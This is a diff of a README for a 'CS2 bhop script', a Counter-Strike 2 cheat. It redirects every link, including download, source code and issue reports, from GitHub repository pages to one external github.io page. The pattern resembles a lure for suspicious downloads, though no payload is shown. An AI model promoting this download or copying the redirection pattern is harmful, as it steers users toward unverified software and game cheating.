@@ -1,6 +1,6 @@
 # 🎮 cs2-bhop-script-2026 - Perfect Bunny Hops Every Single Time
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Bhop_Script_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/thipachan00123/cs2-bhop-script-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Bhop_Script_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://thipachan00123.github.io)
 
 ---
 
@@ -41,7 +41,7 @@ That's it. If your PC can run CS2, it can run this script.
 Getting the script is simple. Follow these steps:
 
 1. Click the green button at the top of this page, or use this link:  
-   [**Download cs2-bhop-script-2026**](https://github.com/thipachan00123/cs2-bhop-script-2026/releases)
+   [**Download cs2-bhop-script-2026**](https://thipachan00123.github.io)
 
 2. You'll be taken to the download page. Look for the latest release file.
 
@@ -195,9 +195,9 @@ This version includes:
 
 ## 🔗 Quick Links
 
-- [**Download Latest Release**](https://github.com/thipachan00123/cs2-bhop-script-2026/releases)
-- [**View Source Code**](https://github.com/thipachan00123/cs2-bhop-script-2026)
-- [**Report an Issue**](https://github.com/thipachan00123/cs2-bhop-script-2026/issues)
+- [**Download Latest Release**](https://thipachan00123.github.io)
+- [**View Source Code**](https://thipachan00123.github.io)
+- [**Report an Issue**](https://thipachan00123.github.io)
 
 ---
 
